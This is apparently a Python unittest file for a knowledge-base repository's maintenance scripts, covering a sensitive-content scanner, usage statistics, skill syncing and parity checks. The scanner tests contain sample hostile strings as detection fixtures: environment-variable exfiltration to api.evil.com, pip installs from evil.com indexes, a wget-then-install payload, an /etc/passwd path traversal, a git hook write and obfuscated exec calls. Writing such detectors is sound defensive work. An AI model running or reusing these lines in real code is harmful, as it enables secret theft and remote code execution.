# -*- coding: utf-8 -*-
"""单元测试：核心纯函数（金字塔底层，最快、最多、无文件系统副作用）

覆盖：
  - scan-sensitive 6 类攻击面 detect_*（命中 / 不命中）
  - stats-unused 日期筛选逻辑（parse_date / load_telemetry / main 建议分类）
  - sync-skills-to-claude  的 skill_name / collect_sources
  - sync-skills-to-hermes  的 ref_scripts / ref_rules / skill_description
  - check-skill-parity     的 check_p1..p6

约定：通过 importlib 加载生产脚本（脚本未被打包为包），只测纯逻辑，
不触碰真实仓库文件。涉及路径常量的用例，monkeypatch 模块级常量到临时目录。
"""
import base64
import importlib.util
import io
import json
import sys
import tempfile
import unittest
from contextlib import redirect_stdout
from datetime import date, timedelta
from pathlib import Path

SCRIPTS = Path(__file__).resolve().parent.parent / "scripts"


def load(module_name: str, file_name: str):
    """按文件名加载生产脚本为模块（不走 sys.modules，测试间相互隔离）"""
    spec = importlib.util.spec_from_file_location(module_name, SCRIPTS / file_name)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


scan = load("scan_sensitive", "scan-sensitive.py")
stats = load("stats_unused", "stats-unused.py")
sync_claude = load("sync_skills_to_claude", "sync-skills-to-claude.py")
sync_hermes = load("sync_skills_to_hermes", "sync-skills-to-hermes.py")
parity = load("check_skill_parity", "check-skill-parity.py")


# ────────────────────────────────────────────────────────────────
# scan-sensitive：6 类攻击面 detect_*（命中/不命中）
# ────────────────────────────────────────────────────────────────
class TestDetectBase64Code(unittest.TestCase):
    def test_hit_when_dangerous_payload_decodes(self):
        payload = base64.b64encode(b"import os; os.system('id')").decode()
        hits = scan.detect_base64_code(f"code = '{payload}'", "test")
        self.assertEqual(len(hits), 1)
        self.assertEqual(hits[0]["type"], "攻击面:Base64解码执行")
        self.assertIn("os.system", hits[0]["snippet"])

    def test_no_hit_for_benign_base64(self):
        safe = base64.b64encode(b"hello world, this is a normal knowledge note").decode()
        hits = scan.detect_base64_code(f"note = '{safe}'", "test")
        self.assertEqual(hits, [])

    def test_no_hit_for_short_token(self):
        hits = scan.detect_base64_code("token = aGVsbG8=", "test")  # < 32 位不纳入
        self.assertEqual(hits, [])

    def test_no_hit_for_binary_base64(self):
        blob = base64.b64encode(b"\x00\x01\x02\x03\x04\x05" * 10).decode()
        hits = scan.detect_base64_code(f"data = '{blob}'", "test")
        self.assertEqual(hits, [])  # 解码后不可打印 → 忽略


class TestDetectEnvExfil(unittest.TestCase):
    def test_hit_when_env_value_sent_to_network(self):
        text = 'url = "https://api.evil.com?k=" + os.environ["API_KEY"]'
        hits = scan.detect_env_exfil(text, "test")
        self.assertEqual(len(hits), 1)
        self.assertEqual(hits[0]["type"], "攻击面:环境变量外泄")

    def test_no_hit_for_env_read_without_network(self):
        hits = scan.detect_env_exfil('home = os.environ.get("HOME")', "test")
        self.assertEqual(hits, [])

    def test_no_hit_for_url_without_env(self):
        hits = scan.detect_env_exfil('url = "https://example.com/health"', "test")
        self.assertEqual(hits, [])

    def test_line_scanning_only_flags_bad_line(self):
        text = ('home = os.environ["HOME"]\n'
                'url = "https://api.evil.com?k=" + os.environ["API_KEY"]\n')
        hits = scan.detect_env_exfil(text, "test")
        self.assertEqual(len(hits), 1)  # 仅第 2 行命中


class TestDetectGitHooks(unittest.TestCase):
    def test_hit_when_write_op_in_hooks_dir(self):
        text = ('hook = ".git/hooks/pre-commit"\n'
                'with open(hook, "w") as f:\n'
                '    f.write("evil")\n')
        hits = scan.detect_git_hooks(text, "test")
        self.assertEqual(len(hits), 1)
        self.assertEqual(hits[0]["type"], "攻击面:.git/hooks注入")

    def test_no_hit_when_merely_documented(self):
        text = 'Learn more about the .git/hooks directory.\nIt is documented in git docs.\n'
        hits = scan.detect_git_hooks(text, "test")
        self.assertEqual(hits, [])


class TestDetectDependencyPoisoning(unittest.TestCase):
    def test_hit_for_plain_http_index(self):
        hits = scan.detect_dependency_poisoning(
            "pip install -i http://evil.com/simple requests", "test")
        self.assertEqual(len(hits), 1)

    def test_hit_for_non_allowlisted_index(self):
        hits = scan.detect_dependency_poisoning(
            "pip install --index-url https://evil.com/simple pkg", "test")
        self.assertEqual(len(hits), 1)

    def test_hit_for_download_then_execute(self):
        hits = scan.detect_dependency_poisoning(
            "wget https://evil.com/payload.whl && pip install payload.whl", "test")
        self.assertEqual(len(hits), 1)
        self.assertIn("下载并执行", hits[0]["snippet"])

    def test_no_hit_for_official_index(self):
        hits = scan.detect_dependency_poisoning(
            "pip install -i https://pypi.org/simple requests", "test")
        self.assertEqual(hits, [])

    def test_no_hit_when_no_index_at_all(self):
        hits = scan.detect_dependency_poisoning("pip install requests", "test")
        self.assertEqual(hits, [])


class TestDetectPathTraversal(unittest.TestCase):
    def test_hit_when_traversal_with_file_io(self):
        hits = scan.detect_path_traversal(
            'open("../../etc/passwd", "r").read()', "test")
        self.assertEqual(len(hits), 1)
        self.assertEqual(hits[0]["type"], "攻击面:路径穿越")

    def test_no_hit_for_doc_relative_path(self):
        hits = scan.detect_path_traversal("See ../docs/guide.md for details.", "test")
        self.assertEqual(hits, [])


class TestDetectObfuscation(unittest.TestCase):
    def test_hit_hex_escape_in_exec(self):
        hits = scan.detect_obfuscation(r'exec("\x68\x65\x6c\x6c\x6f")', "test")
        self.assertEqual(len(hits), 1)

    def test_hit_chr_concat_in_eval(self):
        hits = scan.detect_obfuscation("eval(chr(104) + chr(105))", "test")
        self.assertEqual(len(hits), 1)

    def test_hit_import_concat(self):
        hits = scan.detect_obfuscation('__import__("o" + "s")', "test")
        self.assertEqual(len(hits), 1)

    def test_no_hit_for_normal_exec(self):
        hits = scan.detect_obfuscation("exec(code_to_run)", "test")
        self.assertEqual(hits, [])

    def test_no_hit_for_hex_escape_without_exec(self):
        hits = scan.detect_obfuscation(r'value = "\x68\x65"', "test")
        self.assertEqual(hits, [])


class TestDetectAggregationAndScanText(unittest.TestCase):
    def test_attack_surfaces_aggregates(self):
        text = ('url = "https://api.evil.com" + os.environ["TOKEN"]\n'
                'open("../../x", "w")\n')
        hits = scan.detect_attack_surfaces(text, "t")
        self.assertEqual(len(hits), 2)
        types = {h["type"] for h in hits}
        self.assertEqual(types, {"攻击面:环境变量外泄", "攻击面:路径穿越"})

    def test_scan_text_detects_pii(self):
        text = "我的身份证 110101199001011234，密码 password: hunter2 已改"
        hits = scan.scan_text(text, "t")
        types = {h["type"] for h in hits}
        self.assertIn("身份证", types)
        self.assertIn("密码明文", types)


# ────────────────────────────────────────────────────────────────
# stats-unused：日期筛选逻辑
# ────────────────────────────────────────────────────────────────
class TestParseDate(unittest.TestCase):
    def test_iso_date(self):
        self.assertEqual(stats.parse_date("2026-08-14"), date(2026, 8, 14))

    def test_iso_timestamp(self):
        self.assertEqual(stats.parse_date("2026-08-14T10:30:00"), date(2026, 8, 14))

    def test_zulu_suffix(self):
        self.assertEqual(stats.parse_date("2026-08-14T10:30:00Z"), date(2026, 8, 14))

    def test_invalid_inputs_return_none(self):
        self.assertIsNone(stats.parse_date(""))
        self.assertIsNone(stats.parse_date("   "))
        self.assertIsNone(stats.parse_date("not-a-date"))
        self.assertIsNone(stats.parse_date("2026-13-40"))
        self.assertIsNone(stats.parse_date("2026-8-14"))
        self.assertIsNone(stats.parse_date(None))
        self.assertIsNone(stats.parse_date(123))


class TestLoadTelemetry(unittest.TestCase):
    def _write(self, data):
        td = tempfile.TemporaryDirectory()
        self.addCleanup(td.cleanup)
        p = Path(td.name) / "skill-usage.json"
        p.write_text(json.dumps(data), encoding="utf-8")
        return p

    def test_parses_and_computes_days_since(self):
        today = date.today()
        data = {
            "_meta": {"stage": "x"},
            "recent": {"last_seen": (today - timedelta(days=5)).isoformat(), "count": 3},
            "old": {"last_seen": (today - timedelta(days=100)).isoformat(), "count": 1},
            "never": {"count": 0},
            "not_a_dict": "oops",
        }
        entries = stats.load_telemetry(self._write(data))
        self.assertEqual(entries["recent"]["days_since"], 5)
        self.assertEqual(entries["old"]["days_since"], 100)
        self.assertIsNone(entries["never"]["last_seen"])
        self.assertNotIn("_meta", entries)
        self.assertNotIn("not_a_dict", entries)

    def test_corrupt_file_returns_none(self):
        self.assertIsNone(stats.load_telemetry(self._write("{ not json")))


class TestStatsUnusedMain(unittest.TestCase):
    """main() 的 N 天筛选 → 归档候选/保留 分类（monkeypatch REPO_ROOT + argv）"""

    def _run(self, days, days_since: dict):
        today = date.today()
        data = {"_meta": {"stage": "x"}}
        for name, d in days_since.items():
            data[name] = ({"last_seen": (today - timedelta(days=d)).isoformat()}
                          if d is not None else {"count": 0})
        td = tempfile.TemporaryDirectory()
        self.addCleanup(td.cleanup)
        root = Path(td.name)
        (root / "personal" / "data" / "sessions").mkdir(parents=True)
        (root / "personal" / "data" / "sessions" / "skill-usage.json").write_text(
            json.dumps(data), encoding="utf-8")

        old_repo, old_fw, old_argv = stats.REPO_ROOT, stats.FRAMEWORK, sys.argv
        self.addCleanup(setattr, stats, "REPO_ROOT", old_repo)
        self.addCleanup(setattr, stats, "FRAMEWORK", old_fw)
        self.addCleanup(setattr, sys, "argv", old_argv)
        stats.REPO_ROOT, stats.FRAMEWORK = root, root
        sys.argv = ["stats-unused.py", "--days", str(days)]

        buf = io.StringIO()
        with redirect_stdout(buf):
            code = stats.main()
        return code, buf.getvalue()

    def test_30d_split_keep_vs_archive(self):
        # alpha 40d → 保留；beta 100d → 归档候选；gamma 从未 → 归档候选；delta 5d → 不列入
        code, out = self._run(30, {"alpha": 40, "beta": 100, "gamma": None, "delta": 5})
        self.assertEqual(code, 0)
        self.assertIn("保留", out)
        self.assertIn("归档候选", out)
        self.assertIn("从未触发", out)
        self.assertIn("3/4", out)

    def test_90d_threshold_changes_classification(self):
        # 40d 的 alpha 此时不算未触发 → 仅 beta/gamma
        code, out = self._run(90, {"alpha": 40, "beta": 100, "gamma": None, "delta": 5})
        self.assertEqual(code, 0)
        self.assertIn("2/4", out)
        self.assertNotIn("alpha", out)

    def test_never_triggered_is_archive_candidate(self):
        code, out = self._run(30, {"gamma": None})
        self.assertEqual(code, 0)
        self.assertIn("从未触发", out)
        self.assertIn("归档候选", out)


# ────────────────────────────────────────────────────────────────
# sync-skills-to-claude：skill_name / collect_sources
# ────────────────────────────────────────────────────────────────
class TestSyncClaudeSkills(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.src = Path(self.tmp.name) / "core" / "skills"
        self.dst = Path(self.tmp.name) / ".claude" / "skills"
        self.src.mkdir(parents=True)
        self.dst.mkdir(parents=True)
        # 空 _external 与 personal 目录：collect 时不引入真实仓库 external/personal 技能
        self.src_ext = self.src / "_external"
        self.src_ext.mkdir()
        self.personal = Path(self.tmp.name) / "personal" / "system" / "skills"
        self.personal.mkdir(parents=True)
        a = self.src / "skill-a" / "SKILL.md"
        a.parent.mkdir()
        a.write_text("---\nname: kb-query\ndescription: 检索\n---\n正文\n", encoding="utf-8")
        b = self.src / "skill-b" / "SKILL.md"
        b.parent.mkdir()
        b.write_text("# 无 frontmatter\n", encoding="utf-8")
        (self.src / "resource-dir").mkdir()  # 无 SKILL.md，不应收集
        self.a, self.b = a, b

    def _patch(self):
        old = (sync_claude.SRC, sync_claude.SRC_EXT, sync_claude.SRC_PERSONAL, sync_claude.DST)
        sync_claude.SRC, sync_claude.DST = self.src, self.dst
        sync_claude.SRC_EXT, sync_claude.SRC_PERSONAL = self.src_ext, self.personal
        self.addCleanup(setattr, sync_claude, "SRC", old[0])
        self.addCleanup(setattr, sync_claude, "SRC_EXT", old[1])
        self.addCleanup(setattr, sync_claude, "SRC_PERSONAL", old[2])
        self.addCleanup(setattr, sync_claude, "DST", old[3])

    def test_skill_name_from_frontmatter(self):
        self.assertEqual(sync_claude.skill_name(self.a), "kb-query")

    def test_skill_name_fallback_to_dirname(self):
        self.assertEqual(sync_claude.skill_name(self.b), "skill-b")

    def test_collect_sources_only_skills(self):
        self._patch()
        sources = sync_claude.collect_sources()
        self.assertEqual(set(sources.keys()), {"kb-query", "skill-b"})

    def test_sync_copies_to_dst_and_check_passes(self):
        self._patch()
        sources = sync_claude.collect_sources()
        sync_claude.sync(sources, prune=False)
        self.assertTrue((self.dst / "kb-query" / "SKILL.md").is_file())
        self.assertTrue((self.dst / "skill-b" / "SKILL.md").is_file())
        self.assertEqual(sync_claude.check_only(sources), 0)

    def test_prune_removes_orphan_kb_dir(self):
        self._patch()
        orphan = self.dst / "kb-orphan"
        orphan.mkdir()
        (orphan / "SKILL.md").write_text("x", encoding="utf-8")
        sources = sync_claude.collect_sources()
        sync_claude.sync(sources, prune=True)
        self.assertFalse(orphan.exists())

    def test_check_only_reports_missing(self):
        self._patch()
        sources = sync_claude.collect_sources()
        sync_claude.sync(sources, prune=False)
        for d in self.dst.iterdir():  # 删掉全部平铺 → 全部缺失
            import shutil
            shutil.rmtree(d)
        self.assertEqual(sync_claude.check_only(sources), 2)


# ────────────────────────────────────────────────────────────────
# sync-skills-to-hermes：ref_scripts / ref_rules / skill_description
# ────────────────────────────────────────────────────────────────
class TestSyncHermes(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name)
        self.mgmt = self.root / "core" / "skills"
        self.ext = self.root / "core" / "skills" / "_external"
        self.out = self.root / "ops" / "hermes" / "Hermes-命令索引.md"
        # 空 personal 目录：collect 时不引入真实仓库 personal/system/skills
        self.personal = self.root / "personal" / "system" / "skills"
        self.personal.mkdir(parents=True)
        sk = self.mgmt / "kb-query" / "SKILL.md"
        sk.parent.mkdir(parents=True)
        sk.write_text(
            "---\nname: kb-query\ndescription: 检索知识库\n---\n"
            "调用 engine/scripts/check-inbox.py、engine/scripts/check-links.py、"
            "ops/scripts/stats.sh 与 ops/rules/Ingest完整流程.md、[[ops/rules/Lint检查流程]]。\n",
            encoding="utf-8")
        self.sk = sk
        # 外部技能 + 分类级 SKILL.md（应被跳过）
        (self.ext / "writing" / "novel").mkdir(parents=True)
        (self.ext / "writing" / "novel" / "SKILL.md").write_text(
            "---\nname: kb-novel\ndescription: 小说创作\n---\n正文\n", encoding="utf-8")
        (self.ext / "writing" / "SKILL.md").write_text("分类级 SKILL\n", encoding="utf-8")

    def _patch(self):
        old = (sync_hermes.SRC_MGMT, sync_hermes.SRC_EXT, sync_hermes.SRC_PERSONAL,
               sync_hermes.REPO, sync_hermes.OUT)
        sync_hermes.SRC_MGMT, sync_hermes.SRC_EXT = self.mgmt, self.ext
        sync_hermes.SRC_PERSONAL = self.personal
        sync_hermes.REPO, sync_hermes.OUT = self.root, self.out
        self.addCleanup(setattr, sync_hermes, "SRC_MGMT", old[0])
        self.addCleanup(setattr, sync_hermes, "SRC_EXT", old[1])
        self.addCleanup(setattr, sync_hermes, "SRC_PERSONAL", old[2])
        self.addCleanup(setattr, sync_hermes, "REPO", old[3])
        self.addCleanup(setattr, sync_hermes, "OUT", old[4])

    def test_ref_scripts(self):
        scripts = sync_hermes.ref_scripts(self.sk)
        self.assertEqual(set(scripts), {"check-inbox.py", "check-links.py", "stats.sh"})

    def test_ref_scripts_dedup_and_max5(self):
        sk = self.mgmt / "kb-x" / "SKILL.md"
        sk.parent.mkdir()
        body = "\n".join(f"engine/scripts/s{i}.py" for i in range(8))
        sk.write_text("---\nname: kb-x\n---\n" + body + "\n", encoding="utf-8")
        scripts = sync_hermes.ref_scripts(sk)
        self.assertEqual(len(scripts), 5)  # MAX_REF
        self.assertEqual(len(set(scripts)), len(scripts))

    def test_ref_rules_strips_md_and_filters_wildcard(self):
        sk = self.mgmt / "kb-y" / "SKILL.md"
        sk.parent.mkdir()
        sk.write_text(
            "---\nname: kb-y\n---\n"
            "见 ops/rules/Ingest完整流程.md 与 [[ops/rules/Lint检查流程]]，"
            "以及泛写 ops/rules/*.md。\n",
            encoding="utf-8")
        rules = sync_hermes.ref_rules(sk)
        self.assertIn("Ingest完整流程", rules)
        self.assertIn("Lint检查流程", rules)
        self.assertNotIn("*", "".join(rules))

    def test_skill_description_inline(self):
        self.assertEqual(sync_hermes.skill_description(self.sk), "检索知识库")

    def test_skill_description_block_scalar(self):
        sk = self.mgmt / "kb-z" / "SKILL.md"
        sk.parent.mkdir()
        sk.write_text(
            "---\nname: kb-z\ndescription: |\n  第一行描述\n  第二行继续\n---\n正文\n",
            encoding="utf-8")
        self.assertEqual(sync_hermes.skill_description(sk), "第一行描述 第二行继续")

    def test_collect_sources_skips_category_level(self):
        self._patch()
        sources = sync_hermes.collect_sources()
        names = {n for n, _ in sources}
        self.assertEqual(names, {"kb-query", "kb-novel"})

    def test_build_index_contains_all_skills(self):
        self._patch()
        sources = sync_hermes.collect_sources()
        mgmt = [(n, sync_hermes.skill_description(p / "SKILL.md"), p / "SKILL.md",
                 sync_hermes.ref_scripts(p / "SKILL.md"), sync_hermes.ref_rules(p / "SKILL.md"))
                for n, p in sources if "_external" not in p.parts]
        ext = [(n, sync_hermes.skill_description(p / "SKILL.md"), p / "SKILL.md",
                sync_hermes.ref_scripts(p / "SKILL.md"), sync_hermes.ref_rules(p / "SKILL.md"))
               for n, p in sources if "_external" in p.parts]
        self.out.parent.mkdir(parents=True)
        self.out.write_text(sync_hermes.build_index(mgmt, ext), encoding="utf-8")
        content = self.out.read_text(encoding="utf-8")
        self.assertIn("kb-query", content)
        self.assertIn("kb-novel", content)
        self.assertIn("管理 skill（1）", content)
        self.assertIn("外部 skill（1）", content)
        self.assertIn("check-inbox.py", content)
        self.assertIn("Ingest完整流程", content)


# ────────────────────────────────────────────────────────────────
# check-skill-parity：check_p1..p6
# ────────────────────────────────────────────────────────────────
class TestCheckSkillParity(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name)
        self.dst_claude = self.root / ".claude" / "skills"
        self.dst_codex = self.root / ".agents" / "skills"
        self.src_mgmt = self.root / "core" / "skills"
        self.dst_claude.mkdir(parents=True)
        self.dst_codex.mkdir(parents=True)
        self.src_mgmt.mkdir(parents=True)
        self.skill_src = self.src_mgmt / "kb-query"
        self.skill_src.mkdir()
        (self.skill_src / "SKILL.md").write_text(
            "---\nname: kb-query\n---\n正文引用 engine/scripts/check-inbox.py\n", encoding="utf-8")

    def _patch(self):
        old = (parity.DST_CLAUDE, parity.DST_CODEX, parity.REPO)
        parity.DST_CLAUDE, parity.DST_CODEX = self.dst_claude, self.dst_codex
        parity.REPO = self.root
        self.addCleanup(setattr, parity, "DST_CLAUDE", old[0])
        self.addCleanup(setattr, parity, "DST_CODEX", old[1])
        self.addCleanup(setattr, parity, "REPO", old[2])

    def test_p1_source_exists(self):
        self.assertTrue(parity.check_p1("kb-query", self.skill_src)[0])
        empty = self.src_mgmt / "no-skill"
        empty.mkdir()
        self.assertFalse(parity.check_p1("no-skill", empty)[0])

    def test_p2_claude_reachable(self):
        self._patch()
        ok, why = parity.check_p2("kb-query", self.skill_src, True)  # 平铺缺失
        self.assertFalse(ok)
        self.assertIn(".claude/skills", why)
        (self.dst_claude / "kb-query").mkdir()
        (self.dst_claude / "kb-query" / "SKILL.md").write_text("x", encoding="utf-8")
        self.assertTrue(parity.check_p2("kb-query", self.skill_src, True)[0])
        self.assertTrue(parity.check_p2("kb-query", self.skill_src, False)[0])  # 外部即注入源

    def test_p3_codex_reachable(self):
        self._patch()
        self.assertFalse(parity.check_p3("kb-query")[0])
        (self.dst_codex / "kb-query").mkdir()
        (self.dst_codex / "kb-query" / "SKILL.md").write_text("x", encoding="utf-8")
        self.assertTrue(parity.check_p3("kb-query")[0])

    def test_p4_hermes_indexed(self):
        self.assertTrue(parity.check_p4("kb-query", "| kb-query | 检索 | 脚本 |")[0])
        self.assertFalse(parity.check_p4("kb-query", "| kb-lint | 体检 |")[0])
        self.assertFalse(parity.check_p4("kb-query", "| kb-query | 检索 | 不运行 |")[0])
        self.assertFalse(parity.check_p4("kb-query", None)[0])

    def test_p5_refs_exist(self):
        self._patch()
        (self.root / "engine" / "scripts").mkdir(parents=True)
        (self.root / "engine" / "scripts" / "check-inbox.py").write_text("print(1)\n", encoding="utf-8")
        ok, why = parity.check_p5(self.skill_src)
        self.assertTrue(ok, why)
        (self.skill_src / "SKILL.md").write_text(
            "引用 engine/scripts/does-not-exist.py\n", encoding="utf-8")
        ok2, why2 = parity.check_p5(self.skill_src)
        self.assertFalse(ok2)
        self.assertIn("does-not-exist.py", why2)

    def test_p6_registry_coverage(self):
        rows = {"kb-query": ["kb-query", "检索", "x", "Claude", "Hermes", "Codex", "active"]}
        self.assertTrue(parity.check_p6("kb-query", True, rows)[0])
        self.assertFalse(parity.check_p6("kb-query", True, {})[0])
        rows_blank = {"kb-query": ["kb-query", "检索", "x", "", "Hermes", "Codex", "active"]}
        ok, why = parity.check_p6("kb-query", True, rows_blank)
        self.assertFalse(ok)
        self.assertIn("Claude", why)
        rows_short = {"kb-query": ["kb-query", "检索"]}
        self.assertFalse(parity.check_p6("kb-query", True, rows_short)[0])
        self.assertTrue(parity.check_p6("kb-query", False, {"kb-query": ["kb-query"]})[0])  # 外部仅需名出现


if __name__ == "__main__":
    unittest.main()
